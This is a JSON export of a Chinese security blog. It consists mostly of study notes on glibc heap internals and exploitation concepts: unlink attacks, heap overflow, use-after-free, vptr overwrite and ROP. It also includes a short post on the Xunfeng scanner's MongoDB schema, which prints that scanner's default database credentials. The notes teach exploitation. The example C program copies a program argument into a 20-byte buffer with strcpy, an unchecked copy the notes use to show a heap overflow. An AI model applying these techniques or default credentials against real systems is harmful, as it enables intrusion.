初级","slug":"Pwn学习笔记6-Unlink-Attack-初级","date":"2019-03-18T07:36:12.000Z","updated":"2019-03-18T07:36:51.308Z","comments":true,"path":"2019/03/18/Pwn学习笔记6-Unlink-Attack-初级/","link":"","permalink":"https://darkwing.moe/2019/03/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06-Unlink-Attack-%E5%88%9D%E7%BA%A7/","excerpt":"","text":"Unlink Attack什么是Unlik Attack 比较古老的一种攻击技术 之前的一些CTF比赛中出过这类题目 DEFCON CTF 2014 - Baby’s First: 1 – heap Linux x86二进制程序，之前的Doug Lea’s malloc是静态链接，可以进行简单的Unlik Attack PlaidCTF 2014 - Pwnables200 – ezhp Linux x86二进制程序，使用一个链表来自行管理分配的内存区域，可以进行Unlik Attack DEFCON CTF 2013 - Exploitation5 – yolo FreeBSD x64二进制程序，自己实现的内存管理机制，可以进行Unlik Attack 堆溢出时，如果下面是free状态的chunk，fd/bk可以被覆盖 这种情况就存在Unlink Attack的可能性 fd/bk 是什么 free区域，为了再次利用时的高速，使用了双向链表结构 这是为了快速寻找分散在各个地方的free区块 为此产生了fd/bk指针 各个chunk也存在prev_size和size变量，在图中省略了 正常的free() 假设紧接着P之前的P2是使用中状态 从P2开始，加上自身的size可以知道P的地址 如果在此状态下执行free(P2) ,那么将会产生两个连续的free区域 这将产生一个大的free块，需要从列表中暂时删除P 这是free()内部进行的unlink P2被free时，下面的P也会被unlink，这一点很重要 合并成一个大的free块(然后再次插入相应的列表) exploit的流程 在前面的内存进行堆溢出，覆盖fd 使其指向X 进行free(P2)的时候，相连接的P被unlink 此时，BK和X在链表中相连 忆往昔 DEFCON CTF 2014预选赛出过的一道题，就是利用这样的技巧 Baby’s First: 1 - heap 使用旧时代的libc，并没有太严格的限制 但是，时代变了 看今朝 2004年之后libc中的free()，无法进行这样的Unlink Attack P-&gt;fd-&gt;bk == P P-&gt;bk-&gt;fd == P 加入了这样的判断，如果不满足将产生错误 P-&gt;fd-&gt;bk = X-&gt;bk != P ，unlink之前就会产生错误","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"巡风数据库格式研究及手动导入资产","slug":"巡风数据库格式研究及手动导入资产","date":"2019-03-18T06:14:20.000Z","updated":"2019-03-18T06:31:25.812Z","comments":true,"path":"2019/03/18/巡风数据库格式研究及手动导入资产/","link":"","permalink":"https://darkwing.moe/2019/03/18/%E5%B7%A1%E9%A3%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%BC%E5%BC%8F%E7%A0%94%E7%A9%B6%E5%8F%8A%E6%89%8B%E5%8A%A8%E5%AF%BC%E5%85%A5%E8%B5%84%E4%BA%A7/","excerpt":"","text":"连接及基本信息默认安装环境下： 12345678910111213141516root@ubuntu:&#x2F;opt&#x2F;xunfeng&#x2F;xunfengdb&#x2F;bin# .&#x2F;mongo mongodb:&#x2F;&#x2F;127.0.0.1:65521&#x2F;xunfengMongoDB shell version v3.4.0connecting to: mongodb:&#x2F;&#x2F;127.0.0.1:65521&#x2F;xunfengMongoDB server version: 3.4.0&gt; db.auth(&#39;scan&#39;,&#39;scanlol66&#39;)1&gt; show collectionsConfigHeartbeatHistoryInfoPluginResultStatisticsTaskUpdate 资产相关表根据巡风代码，主要是Info表 https://github.com/ysrc/xunfeng/blob/master/nascan/lib/scan.py 123mongo.NA_INFO.insert(&#123;&quot;ip&quot;: self.ip, &quot;port&quot;: self.port,“hostname&quot;: hostname, &quot;banner&quot;: banner, &quot;time&quot;: time_&#125;) mongo.NA_INFO.update(&#123;&#39;ip&#39;: self.ip, &#39;port&#39;: self.port&#125;,&#123;&quot;$set&quot;: &#123;&#39;banner&#39;: self.banner, &#39;server&#39;: &#39;web&#39;, &#39;webinfo&#39;: web_info,&#39;time&#39;: time_&#125;&#125;) 以一条具体数据为例： 123db.Info.find()&#123; &quot;_id&quot; : ObjectId(&quot;id信息&quot;), &quot;ip&quot; : &quot;ip_address&quot;, &quot;hostname&quot; : &quot;hostname_miao&quot;, &quot;time&quot; : ISODate(&quot;2019-03-06T02:49:18.268Z&quot;), &quot;banner&quot; : &quot;banner 信息&quot;, &quot;port&quot; : 2333, &quot;webinfo&quot; : &#123; &quot;tag&quot; : [ &quot;php&quot;,&quot;apache&quot;], &quot;title&quot; : &quot;Error 404 Not Found&quot; &#125;, &quot;server&quot; : &quot;web&quot; &#125; 在巡风web界面大概是这样 ip，port，hostname，banner等顾名思义 server：web webinfo中php，apache 打码的蓝色信息为webinfo中title 可以获取下Info中的key： 123456789101112131415161718192021222324mr &#x3D; db.runCommand(&#123; &quot;mapreduce&quot; : &quot;Info&quot;, &quot;map&quot; : function() &#123; for (var key in this) &#123; emit(key, null); &#125; &#125;, &quot;reduce&quot; : function(key, stuff) &#123; return null; &#125;, &quot;out&quot;: &quot;Info&quot; + &quot;_keys&quot; &#125;)&#123; &quot;result&quot; : &quot;Info_keys&quot;, &quot;timeMillis&quot; : 112, &quot;counts&quot; : &#123; &quot;input&quot; : 1209, &quot;emit&quot; : 8707, &quot;reduce&quot; : 102, &quot;output&quot; : 8 &#125;, &quot;ok&quot; : 1&#125;&gt; db.Info_keys.distinct(&quot;_id&quot;)[ &quot;_id&quot;, &quot;banner&quot;, &quot;hostname&quot;, &quot;ip&quot;, &quot;port&quot;, &quot;server&quot;, &quot;time&quot;, &quot;webinfo&quot;] 可以看到主要就这些信息 因此如果认为巡风自身资产探测不完善，需要手工导入资产信息，既可以按照这种格式构造数据进行导入","categories":[],"tags":[]},{"title":"Pwn学习笔记5:堆溢出与User After Free","slug":"Pwn学习笔记5-堆溢出与User-After-Free","date":"2019-03-15T06:29:34.000Z","updated":"2019-03-15T06:30:21.298Z","comments":true,"path":"2019/03/15/Pwn学习笔记5-堆溢出与User-After-Free/","link":"","permalink":"https://darkwing.moe/2019/03/15/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%8EUser-After-Free/","excerpt":"","text":"堆溢出 原理非常简单 数据溢出并覆盖下一个区域 如果下面有认证信息或重要数据，则可以破坏/覆盖 如果溢出目标是函数指针，则可以进行pwn func_ptr overwrite 当函数被调用时，则变成了调用system 如果下面是free chunk，则管理数据会被破坏 heap管理变得奇怪的话，进程可能会crash 以之前的例子1进行尝试 正常运行是上面这样的 过长数据破坏heap管理区域是下面这样的 12345$ .&#x2F;a.out TESTTESTTESTTESTTESTTEST TESTTESTTESTTESTTESTTEST$ .&#x2F;a.out TESTTESTTESTTESTTESTTESTTEST TESTTESTTESTTESTTESTTESTTEST*** Error in &#96;.&#x2F;a.out&#39;: free(): invalid next size (fast): 0x00000000006de010 ***Aborted (core dumped) Use After Free 顾名思义，heap内存释放后再次使用 假设用户已经通过new获取了可以读取写入的内存 假设已进行delete ptr操作 这时候，原本的ptr已经不能使用 但是，由于Use After Free问题，仍然可以直接读取和写入此地址 假设通过new获取了ptr2 它恰好和之前的ptr指向同一个地方，需要考虑到这种情况 堆释放后可能被再次利用，就是因为这个 如果ptr2是object，它通常有一个虚函数表 指向这个虚函数表的的指针叫做vptr 因为ptr可能还会使用，从ptr进行覆盖可能会改变vptr vptr overwrite vptr指向可控区域，并将内容设置为system地址等 这样当调用函数时，实际调用的是system Use After Free很难找到 阅读大部分代码，如果不了解整体行为，通常无法找到它 通常，对应的malloc和free可能跨越多个函数，需要准确掌握具体的调用位置 另外，你必须找出Use After Free的调用顺序 重点关注使用malloc/free或者new/delete较多的的二进制 这样的二进制文件就很可疑 用户输入可以自由创建object 笔记管理类 购物车系统 自己实现的内存管理机制 这种也是可能的 func_ptr overwrite + ROP 预先将ROP等加载到stack上的变量中(前提是能够加载) 通过Use After Free，在vptr之前，写入pop×N; ret之类的代码 当调用该函数时，pop×N去除其他的参数，之后触发ROP","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记4:heap布局","slug":"Pwn学习笔记4-heap布局","date":"2019-03-14T07:02:59.000Z","updated":"2019-03-14T07:03:32.606Z","comments":true,"path":"2019/03/14/Pwn学习笔记4-heap布局/","link":"","permalink":"https://darkwing.moe/2019/03/14/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-heap%E5%B8%83%E5%B1%80/","excerpt":"","text":"heap布局 使用中和free区域混杂在一起 各个block被称为chunk 想要再次使用free状态的区域 需要知道哪里有free的区域，因此它是链表结构 实际上没这么简单 malloc获得的是这个地址 size按照8的倍数进行padding 为简单起见，图中省略了fd_nextsize和bk_nextsize 实际上的结构体：123456789struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; &#x2F;* Size of previous chunk (if free). *&#x2F; INTERNAL_SIZE_T mchunk_size; &#x2F;* Size in bytes, including overhead. *&#x2F; struct malloc_chunk* fd; &#x2F;* double links -- used only if free. *&#x2F; struct malloc_chunk* bk; &#x2F;* Only used for large blocks: pointer to next larger size. *&#x2F; struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F; struct malloc_chunk* bk_nextsize;&#125;; 来源：https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk 填充 仅在前一个chunk已经free时才能访问 末尾3个字节有特定的用途 最低一位(PREV_INUSE) 前一个chunk是否已被使用 低二位(IS_MMAPED) 是否是mmap获取的地址(大的内存通过mmap获取) 低三位(IS_NON_MAINARENA) 是否来自main_arena(多线程时，使用多个arena进行heap管理)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记3:heap","slug":"Pwn学习笔记3-heap","date":"2019-03-14T06:32:44.000Z","updated":"2019-03-14T06:33:38.313Z","comments":true,"path":"2019/03/14/Pwn学习笔记3-heap/","link":"","permalink":"https://darkwing.moe/2019/03/14/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-heap/","excerpt":"","text":"heap为什么提到堆： stack exploit类型的题目在很多CTF中都出现过 writeup简单学习下就能够理解 网络上也有很多相关资料 很少有CTF队伍主攻heap 主攻pwn的队伍都很少 通常这类问题分值较高 这是必须加强的部分 什么是堆 调用malloc()或者 new()时使用的是heap区域 heap区域中，”使用中”和”已free”的内存状态大不相同 详情可以通过小崎老师发布的malloc视频来了解 https://www.youtube.com/watch?v=0-vWT-t0UHg http://www.slideshare.net/kosaki55tea/glibc-malloc 视频大概两个小时，强烈建议看一次 使用heap的程序例子11234567891011#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt;int main(int argc, char* argv[])&#123; char* ptr; ptr &#x3D; (char*)malloc(20); strcpy(ptr, argv[1]); printf(&quot;%s\\n&quot;, ptr); free(ptr); return 0; &#125; 分配20字节内存 字符串拷贝 显示拷贝内容 释放 实际运行大概像这样： 123$ gcc heap1.c$ .&#x2F;a.out miaomiaomiaomiao 使用heap的程序例子2123456789#include &lt;iostream&gt; int main(void)&#123; int *p; p &#x3D; new int(); std::cin &gt;&gt; *p; std::cout &lt;&lt; *p &lt;&lt; std::endl; delete p; return 0;&#125; 分配int变量内存 读取值 显示值 释放 实际运行大概像这样： 1234$ g++ heap2.cpp$ .&#x2F;a.out66 malloc和new是从哪里获取内存的？答案是heap 从以下区域分配内存 不使用时使用free()进行释放 如果malloc次数过多，heap自身会因为不足而扩张(sbrk) 太大的内存请求将通过另一种方式分配(mmap) sbrk/mmap在malloc内部自动进行 编写程序时并不需要非常在意heap机制 只需要用了malloc() 后记得最终free()即可 使用错误会产生漏洞 需要了解细节的是 malloc/free是glibc提供的，直接去看源码是最好的学习方法","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Arena对齐及总结","slug":"Arena对齐及总结","date":"2019-03-11T08:32:41.000Z","updated":"2019-03-11T08:34:26.922Z","comments":true,"path":"2019/03/11/Arena对齐及总结/","link":"","permalink":"https://darkwing.moe/2019/03/11/Arena%E5%AF%B9%E9%BD%90%E5%8F%8A%E6%80%BB%E7%BB%93/","excerpt":"","text":"Arena 1M对齐方法图解 想要的是这样的内存 但通过mmap做不到这一点 2倍size的mmap 但是PROT_NONE RWX权限都没有，这已经不能算内存分配了，可以叫做地址空间 1M对齐的场所中，通过remap对size 1M进行RWX权限分配 剩余的空间进行munmap 总结 小型malloc如果经常出现的话，复杂度是O(n)，太糟了 防止碎片化，Huge Block将heap分开是有效的 要提高缓存命中率，引用局部性非常重要 每个线程的数据结构是每个CPU的数据结构的良好近似值 glibc malloc的缺点 由于Huge Block是绝对页对齐的，缓存很容易出现竞争(在HPC领域中通常关闭此机制) 如果是用另一种方式，将不会锁定Arena自身(这就是产生问题的heavy allocation，应用作heap自身管理，很难看到效果) 最新的dlmalloc对large bin的管理已经从列表变成了二叉树来提高速度(尽管利用率太低，效果很微妙) 最终 glibc malloc是今天的主要内容，针对int_malloc各个方面将近90页的PPT阅读不容易 源代码中的注释我觉得是在骗我，阅读用了差不多一小时 函数划分用了有两小时 构造体类型与内存上的数据结构对应用三小时 这样看起来Linux 内核还是很容易读的嘛","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"arena生成","slug":"arena生成","date":"2019-03-07T07:10:32.000Z","updated":"2019-03-07T07:11:24.081Z","comments":true,"path":"2019/03/07/arena生成/","link":"","permalink":"https://darkwing.moe/2019/03/07/arena%E7%94%9F%E6%88%90/","excerpt":"","text":"坏主意1从TLS获得arena 在获得自身专用的arena之前，有一部分是需要从main_arena中获取的，并且它必须返回给main_arena 坏主意2在每个malloc header中添加一个指向arena的指针 自寻死路，很多份4个字节 坏主意3从main_arena(唯一的全局变量)中延伸出arena的列表 检索复杂度是O(n) 结论？ arena是固定内存1M对齐，谈后，我们需要ptr &amp; ~0xFFFFF来获得指向arena的指针 课题1main_arena只是一个全局变量 每次都是熟悉的size 课题2Linux中并没有确保1M对齐的内存系统调用 可以通过以下棘手的方式完成","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Arena与多线程","slug":"Arena与多线程","date":"2019-03-05T06:33:48.000Z","updated":"2019-03-05T06:34:30.638Z","comments":true,"path":"2019/03/05/Arena与多线程/","link":"","permalink":"https://darkwing.moe/2019/03/05/Arena%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"Arena生成 main_arena == 之前说明过的heap Arena生成thread2 thread2被锁定 别的thread如果同时调用malloc，会因为锁(mutex_trylock)而失败 内存中arena结构体(包含bin数组的结构体) 新的自身专用heap通过mmap生成 这个altanative heap的构造被称为arena 记住TLS(thread local strage) 中自慎用arena，除非开辟新thread或者用尽1M内存，否则不要在此触碰它 Arena生成thread3 下一个thread也一样，继续使用main_arena，直到发生锁竞争 如果锁命中。。。 arena list，如果出现所有的锁都取得失败的情况，那么将创建一个新的专用arena thread不会突然创建arena 这是为了避免结束时专用arena被浪费 这样的结果，thread生成后会在各种arena中发生锁竞争 并且，收束到一个thread，一个arena中 1个thread，一个arena的隐藏优点 SMP机器中，从另一个CPU访问的内存不会占用自身CPU的缓存，因此如果只是简单管理上次访问，则不太方便 但是，从用户空间来看，你并不知道运行的是哪个CPU（它会自行改变） 因此，要注意内核线程的CPU亲和性调度，自身CPU访问自身线程数据的概率更高 线程专用内存=缓存命中率大幅UP 顺便说一下free的时候，如法确定自己的所属arena？","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"多线程lock问题","slug":"多线程lock问题","date":"2019-03-04T07:02:45.000Z","updated":"2019-03-04T07:03:15.308Z","comments":true,"path":"2019/03/04/多线程lock问题/","link":"","permalink":"https://darkwing.moe/2019/03/04/%E5%A4%9A%E7%BA%BF%E7%A8%8Block%E9%97%AE%E9%A2%98/","excerpt":"","text":"古典lock 很简单的，使用互斥锁来保护整个函数 实际想要这样 没有锁的简单世界 多线程 这确实是不可能的 没有办法事先知道应用创建了多少个线程 没有办法事先知道一个线程将使用多少内存 如果ITRON(Industrial the Real-Time Operation System Nucleus，工业实时操作系统中心)之类的都在编译时决定。。。 因此，我们将在运行时创建一个新的heap，如下所示","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"延迟合并","slug":"延迟合并","date":"2019-03-04T06:48:17.000Z","updated":"2019-03-04T06:48:44.588Z","comments":true,"path":"2019/03/04/延迟合并/","link":"","permalink":"https://darkwing.moe/2019/03/04/%E5%BB%B6%E8%BF%9F%E5%90%88%E5%B9%B6/","excerpt":"","text":"回顾K&amp;R free 现在free list head指向释放掉的节点 缓存和本地引用 对heap内存访问概率最高的是在malloc之后立即free 刚刚free的内存在缓存上的概率很高 为了优先确保内存，malloc之后直接访问，不会出现缓存miss 缓存命中率很重要 缓冲区的延迟合并 当调用free时，立即 与相邻空间合并，并且暂时不会进行连接到free list的处理 最初实现这种方式的是SVR4(相当早的UNIX内核) malloc-free-malloc-free这类常见的访问模式导致内存块的分离-合并-分离-合并之类的不必要处理，延迟合并能够避免这种情况。 并且，由于按照时间顺序对free进行连接，因此将列表头部的block返回到应用程序可以提高缓存命中率。 glibc malloc的最低确保单位是32，bin[0]和bin[1]不能使用 bin[1]用来存放这个延迟的block所要连接的list的header 源码中叫做unsorted_chunk，不进行排序，而是按照时间顺序 通过遍历列表，找到与要求size一致的 与要求size不一致的，在这个时间，与相邻空间合并后进行实际的free处理 从宏观角度 malloc的调用模式大致上是以下流程 应用启动时会调用malloc，很少调用free 之后，进入malloc和free大体上交错被调用的正常状态 像GUI画面切换之类的，会触发，free被单独调用，之后malloc被调用，数据结构体也会有大的变化 之后再次进入正常状态 malloc的正常状态和突发状态 延迟合并有时会事与愿违，但可以接受，因为它在正常状态下是高速化的 还有一点每个人都喜欢多线程","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"mmap","slug":"mmap","date":"2019-02-28T07:15:22.000Z","updated":"2019-02-28T07:16:02.964Z","comments":true,"path":"2019/02/28/mmap/","link":"","permalink":"https://darkwing.moe/2019/02/28/mmap/","excerpt":"","text":"什么是匿名mmap？ mmap最初是一个将文件映射到内存中的系统调用 但是，如果将”/dev/zero”作为fd参数传递，它可以用作内存预留API 使用此API，mmap可以直接从kernel中获取Huge Block(默认情况下超过128k字节)，而不是从heap获取 再次回顾一下size的低位bit 低位第二个bit是IS_MMAPED标志位 另一个标志位如果是ON，那么将不是从free list获取而是通过MMAP。free的时候也不会连接到free list，而是使用munmap(). 数据构造图解 不存在free状态的huge，因为它在释放的同时返回到操作系统 这种方式的优点 Huge Block的malloc，free都是O(1) 不容易产生碎片空间(因为它不需要管理列表) 内存浪费少(由于以相同size再次进行malloc的概率很小，因此立即将其返回给操作系统是一个明智的策略) 目前已有的结果变好的地方： malloc是典型的O(1) free是典型的O(1) 碎片现在很难出现 header size实际上是4bit 当发生brk时，K&amp;R malloc需要对freelist进行一次遍历，这种方式只需要找到比要求的size大的bin，平均探索花费是1/2 变差的地方： ？？？ 即便如此实际上还是输给了K&amp;R malloc 因为实际上，large size block的malloc-&gt;free-&gt;malloc的重复操作很慢","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"small bin与large bin","slug":"small-bin与large-bin","date":"2019-02-28T05:33:03.000Z","updated":"2019-02-28T05:34:58.418Z","comments":true,"path":"2019/02/28/small-bin与large-bin/","link":"","permalink":"https://darkwing.moe/2019/02/28/small-bin%E4%B8%8Elarge-bin/","excerpt":"","text":"small bin 结构体大体上适合这个size，并不是best fit，只是just fit 分配器 进一步改进 不处理512字节之上的部分 但是，对于较大的size也用这种8bit单位的bin是不现实的 但是可以用多个列表，这个想法还不错 large bin 单位是64bit 随着bin index增大，有必要将block size指数增大 由于有许多较小的size，有必要采取平均到各个列表的措施 但是 无论怎么做，最后一个bin都会是完全连接 处理图像之类的时候，正常都会产生几十MB的malloc 如果额外准备另一个heap，就可以分离出来更大的内存 这就是mmap","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"header的约束","slug":"header的约束","date":"2019-02-25T07:17:51.000Z","updated":"2019-02-25T07:18:28.348Z","comments":true,"path":"2019/02/25/header的约束/","link":"","permalink":"https://darkwing.moe/2019/02/25/header%E7%9A%84%E7%BA%A6%E6%9D%9F/","excerpt":"","text":"header需要必要的约束 首先，分配的内存块不需要free list的指针，bk，fd等 可以简单的删除它 需要注意访问方法 当我们转向malloc_chunk结构体来访问它时，可以看到存在fd，bk，实际上它们已经被用户应用所使用，如果访问会造成内存破坏 很难从源代码中读取 约束继续进行 经常要考虑的 prev_size在free时候的合并处理是必要的 只有当prev处于free状态时，是必要的 只有在prev处于free状态时才记录prev_size 那么，如何确认prev是否是free状态(先有鸡还是先有蛋的问题) 32位系统的指针 最低2位固定是0 glibc malloc实际上内部会取8的倍数，因此最低3位是0 size记录两个指针之间的差，当然，最低3位同样是0 也就是说 size的最低一位用于记录prev的使用状态 结构体类型和内存中的数据结构不一致，这是为什么难以读区的原因 在时间序列中 显然，从malloc header直接访问malloc chunk会出错，因为fd，bk被用户应用所使用 free的时候会第一次写入fd，bk，prev_size prev_in_use flag是1 size之外，malloc时不会确保，但它是free的，可以直接使用 源上的内存破坏很多 可以进行约束了吗 从某种意义上来说，今天的代码阅读是最难的一部分(其他部分是可读性很好的C语言) 接下来是最大的课题。malloc是典型的O(n),来解决这个问题吧 这里有一点主意 在free list中，不需要讲所有的列表都连接起来 size是固定8的倍数 best fit应当是O(1)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"K&R malloc","slug":"K-R-malloc","date":"2019-02-25T06:11:43.000Z","updated":"2019-02-25T06:16:35.020Z","comments":true,"path":"2019/02/25/K-R-malloc/","link":"","permalink":"https://darkwing.moe/2019/02/25/K-R-malloc/","excerpt":"","text":"K&amp;R malloc的优点 简单 代码大小很小(malloc仍然内置等) 除非有大量碎片空间，否则malloc是O(1) 复杂度 适用于小程序，整个程序中只使用几十次malloc K&amp;R malloc的缺点 当小型malloc频繁出现时，会出现大量碎片空间 free是O(n)复杂度 在调用brk时，需要遍历freelist一次(如果有数万个列表，缓存、刷新、代码状态将是很恐怖的) 当碎片空间增加，内存效率也急速恶化 时代变了 现在的编程语言 GUI 脚本语言或者Java C++程序语言 等等 只重复一个小型的malloc 最大的问题是什么 在这里，首先假定碎片是最大的问题 如果能够解决碎片问题 内存使用效率UP 内存使用量较少，缓存效率UP 看起来很酷 现在需要best fit 分配器，根据just Idea来实现它停止使用地址顺序，尝试使用size顺序进行排序 free的时候，不可能和相邻节点合并 就会产生额外的碎片空间 毕竟我们需要将新增成员增加到malloc header里 地址空间的prev，next不是用指针保持的，而是用size 发生了什么变化 哪里变好了 free从典型的O(n) 变成了O(1) 碎片造成的空间浪费减少了 哪里变得更糟糕 malloc从O(1)变成了O(n) header size增加，空间效率降低 这可不行，接下来进入正题","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"堆扩展及brk","slug":"堆扩展及brk","date":"2019-02-22T07:37:07.000Z","updated":"2019-02-22T07:37:44.656Z","comments":true,"path":"2019/02/22/堆扩展及brk/","link":"","permalink":"https://darkwing.moe/2019/02/22/%E5%A0%86%E6%89%A9%E5%B1%95%E5%8F%8Abrk/","excerpt":"","text":"堆扩展 因为堆并不是无限的，有时会出现空间不足的情况 这时候，我们会使用brk系统调用来扩展heap区域，brk是一个用来更改heap结尾地址的API 增加的区域分成两部分，前面一部分返回给用户，剩下的追加到free list中 简单的brk实现 data段包括静态数据和stack 当前大小以及增量（内核中）malloc 复制到新内存中 对旧的数据进行mfree stack复制到内存末尾 stack和静态数据之间的数据清零 也就是说 内核brk很慢 为了尽量少的调用brk，用户空间存在一种”尽量少使用brk，一次性获取足够需求”的方针 这被实现为一种价值观 那么： 实际上，现代Linux中brk已经变得很快速。但是暂时先不考虑这个。 现在我们以brk很慢为前提，来考虑如何提高malloc的速度","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"malloc及free算法","slug":"malloc及free算法","date":"2019-02-22T06:32:00.000Z","updated":"2019-02-22T06:32:39.950Z","comments":true,"path":"2019/02/22/malloc及free算法/","link":"","permalink":"https://darkwing.moe/2019/02/22/malloc%E5%8F%8Afree%E7%AE%97%E6%B3%95/","excerpt":"","text":"Linux中进程地址空间模型 古典的malloc 使用free list来管理空闲内存 整个进程只使用一个heap 使用malloc的时候，管理区域会使用多个allocate，并且将头部追加到管理区域（如果某个地方没有管理区域，那么在free的时候将不知道需要释放的size） 分配策略是first fit malloc的算法 首先，从列表头获取头指针 检查可用空间是否足够 指针前进到列表的下一个节点 检查可用空间是否足够 再次将指针前进到列表的下一个节点 再次，检查可用空间 此时，满足条件 将空闲区域分成两部分 更新list head 此时first list的head： 最终搜索失败的地方（分配内存的前一个节点） 实际情况 实际上会寻找一个更合适的区域 free的算法 从free list head获取第一个指针 获取第一个节点的下一个指针(next = p-&gt;s.ptr) 由于p&lt;bp&lt;next 不成立，进入下一步 p前进到下一个节点 获取下一个指针 p&lt;bp&lt;next成立 p和bp不相邻( p + p-&gt;size != bp) 因为bp和p-&gt;s.ptr相邻(bp + bp-&gt;s.size == next)，合并 free list head现在指向释放掉的节点","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记2:内存布局","slug":"Pwn学习笔记2-内存布局","date":"2019-02-21T07:19:12.000Z","updated":"2019-02-21T07:20:32.817Z","comments":true,"path":"2019/02/21/Pwn学习笔记2-内存布局/","link":"","permalink":"https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/","excerpt":"","text":"0x01 内存布局大部分Linux： .text 汇编代码 .data 有初始值的数据 .bss 无初始值的数据 heap 堆 shared object 共享对象区域(libc.so之类的) stack 栈 kernel-area 内核区域 实际数值大概像这样： gdb-peda/pwndbg 下可以直接使用vmmap 也可以通过cat /proc/$PID/maps 每行有各种属性（Read,Write,eXec） p是private mapping，变更不会反映在文件上 地址是0x1000的倍数，这个单位被称为”页” 进程启动时，ELF加载确保这样的内存布局 使用mmap()进行确保，并且通过sbrk()来做自动补齐 进程启动后，进程自身也可以使用mmap()来进行追加确保 补足 这里是虚拟内存，与物理内存存在差异 物理内存和虚拟内存都与内核相关联，这是一种被称为MMU(Memory Management Unit)的机制 用户程序只能看到虚拟内存，并不需要考虑物理内存 NX、ASLR、PIE 这个例子有0x0804XXXX和0xfXXXXXXX两种类型的起始地址，前者在堆之外每次启动不会变化，后者每次启动都会发生改变，这被称为ASLR(Address space layout randomization，地址空间配置随机加载)。 对前者也进行随机化的技术叫做PIE(position-independent executable, 地址无关可执行文件). 这个例子中stack，mapped之类的很多地方都是rwx，也就是说，可以在这些内存区域进行读取，写入和执行。 